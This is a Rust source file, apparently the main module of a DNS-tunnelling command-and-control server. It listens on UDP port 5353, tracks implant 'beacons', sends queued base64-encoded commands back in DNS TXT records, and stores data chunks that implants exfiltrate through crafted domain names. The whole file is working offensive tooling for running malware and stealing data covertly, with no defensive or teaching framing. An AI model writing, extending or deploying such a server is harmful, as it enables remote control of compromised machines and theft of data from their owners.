mod server;
use server::*;
use std::io::{self, Write};
use std::net::UdpSocket;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

fn main() -> std::io::Result<()> {
    print_banner();

    let socket = UdpSocket::bind("0.0.0.0:5353")?;
    let c2_state = Arc::new(Mutex::new(C2State::new()));

    // Start CLI thread
    let cli_state = Arc::clone(&c2_state);
    thread::spawn(move || {
        cli_loop(cli_state);
    });

    
    // Start cleanup thread - runs every 60 seconds
    let cleanup_state = Arc::clone(&c2_state);
    thread::spawn(move || {
        loop {
            thread::sleep(Duration::from_secs(60));
            let mut state = cleanup_state.lock().unwrap();
            let removed = state.cleanup_stale_sessions();
            if removed > 0 {
                println!("\n[!] Auto-cleanup removed {} stale session(s)", removed);
                print!("c2> ");
                io::stdout().flush().ok();
            }
        }
    });


    let mut buf = [0u8; 512];

    loop {
        let (len, src) = socket.recv_from(&mut buf)?;

        println!("\n[+] DNS Query from {}", src);

        match DnsHeader::from_bytes(&buf[..len]) {
            Ok(_header) => {
                if let Ok(question) = parse_question(&buf, 12) {
                    println!("    Domain: {} (Type: {:?})", question.name, question.qtype);

                    if let Some(c2_req) = parse_c2_request(&question.name) {
                        let mut state = c2_state.lock().unwrap();

                        match c2_req {
                            C2Request::Beacon { implant_id } => {
                                println!("    [BEACON] {}", implant_id);
                                state.get_or_create_session(&implant_id);
                                let has_cmds = state.has_commands(&implant_id);
                                let response = build_a_record_response(
                                    &buf[..len],
                                    12 + question.name_length,
                                    has_cmds,
                                );
                                socket.send_to(&response, src)?;
                                println!(
                                    "    Response: {}",
                                    if has_cmds {
                                        "Commands queued"
                                    } else {
                                        "No commands"
                                    }
                                );
                            }

                            C2Request::FetchCommand { implant_id } => {
                                println!("    [FETCH_CMD] {}", implant_id);

                                if question.qtype == QType::TXT {
                                    if let Some(cmd) = state.get_next_command(&implant_id) {
                                        let encoded = base64_encode(&cmd);
                                        let response = build_txt_record_response(
                                            &buf[..len],
                                            12 + question.name_length,
                                            &encoded,
                                        );
                                        socket.send_to(&response, src)?;
                                        println!("    Sent: {}", cmd);
                                    } else {
                                        let response = build_txt_record_response(
                                            &buf[..len],
                                            12 + question.name_length,
                                            "NONE",
                                        );
                                        socket.send_to(&response, src)?;
                                        println!("    No commands available");
                                    }
                                }
                            }

                            C2Request::Exfiltrate {
                                implant_id,
                                sequence,
                                data,
                            } => {
                                println!(
                                    "    [EXFIL] {} [seq:{}] data:{}",
                                    implant_id, sequence, data
                                );
                                state.store_chunk(&implant_id, sequence, data);

                                let response = build_a_record_response(
                                    &buf[..len],
                                    12 + question.name_length,
                                    false,
                                );
                                socket.send_to(&response, src)?;
                                println!("    ACK sent");
                            }
                        }
                    }
                }
            }
            Err(e) => {
                println!("    [!] Error: {}", e);
            }
        }
    }
}
